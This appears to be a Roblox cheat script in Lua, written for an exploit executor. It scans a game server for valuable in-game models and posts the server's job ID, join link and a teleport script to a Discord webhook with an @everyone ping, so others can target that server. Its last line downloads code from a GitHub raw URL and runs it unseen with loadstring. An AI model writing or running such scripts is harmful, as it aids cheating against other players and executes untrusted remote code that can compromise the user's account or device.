local mutationMultipliers = {
    ["Gold"] = 1.25, ["Diamond"] = 1.50, ["Rainbow"] = 10, ["Lava"] = 6,
    ["Bloodrot"] = 2, ["Celestial"] = 4, ["Candy"] = 4, ["Raining Tacos"] = 3,
    ["Tung Tung Attack"] = 4, ["Glitch"] = 5, ["Crab Rave"] = 5, ["Fire"] = 5,
    ["4th of July"] = 6, ["Nyan Cats"] = 6, ["Concert"] = 5, ["10B Visits"] = 4,
    ["Rain"] = 4, ["Snow"] = 3, ["Starfall"] = 6
}

local sent = false

local function formatMoney(v)
    if v >= 1e9 then
        return string.format("$%dB/s", v / 1e9)
    elseif v >= 1e6 then
        return string.format("$%dM/s", v / 1e6)
    elseif v >= 1e3 then
        return string.format("$%dK/s", v / 1e3)
    else
        return "$" .. v .. "/s"
    end
end

local function getMutationMultiplier(name)
    for mutation, mult in pairs(mutationMultipliers) do
        if string.find(name, mutation) then
            return mult
        end
    end
    return 1
end

local function sendWebhookMultiple(models)
    if sent then return end
    sent = true
    local namesList = {}
    local valuesList = {}
    for _, m in ipairs(models) do
        table.insert(namesList, m.name)
        table.insert(valuesList, formatMoney(m.value))
    end
    local embed = {
        title = "ðŸ§  Brainrot Notify | Omxrrâ€™s Hub",
        color = 3092790,
        fields = {
            { name = "ðŸ· Names", value = table.concat(namesList, ", "), inline = false },
            { name = "ðŸ“ˆ Generation", value = table.concat(valuesList, ", "), inline = false },
            { name = "ðŸ‘¥ Players", value = tostring(#game.Players:GetPlayers()).."/"..tostring(game.Players.MaxPlayers), inline = false },
            { name = "ðŸ’» Job ID (PC)", value = game.JobId, inline = false },
            { name = "ðŸ“± Job ID (Mobile)", value = game.JobId, inline = false },
            { name = "ðŸ”— Join Link", value = "[Click to Join](https://www.roblox.com/games/start?placeId="..getgenv().ALLOWED_PLACE_ID.."&gameInstanceId="..game.JobId..")", inline = false },
            { name = "ðŸ“œ Join Script (PC)", value = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..getgenv().ALLOWED_PLACE_ID..",\""..game.JobId.."\",game.Players.LocalPlayer)", inline = false },
        },
        footer = { text = "Made by Omxrrâ€™s Hub â€¢ "..os.date("%d/%m/%Y %H:%M") }
    }
    http_request({
        Url = getgenv().WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "@everyone",
            embeds = {embed}
        })
    })
end

local function checkForModels()
    local foundModels = {}
    for modelName, settings in pairs(getgenv().MODEL_SEARCH_SETTINGS) do
        if settings.enabled then
            local found = workspace:FindFirstChild(modelName, true)
            if found then
                local value = settings.value * getMutationMultiplier(found.Name)
                table.insert(foundModels, { name = found.Name, value = value })
            end
        end
    end
    if #foundModels > 0 then
        sendWebhookMultiple(foundModels)
    end
end

task.spawn(function()
    while task.wait(getgenv().CHECK_COOLDOWN) do
        if not sent then
            checkForModels()
        end
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/keyless/refs/heads/main/keyless"))()
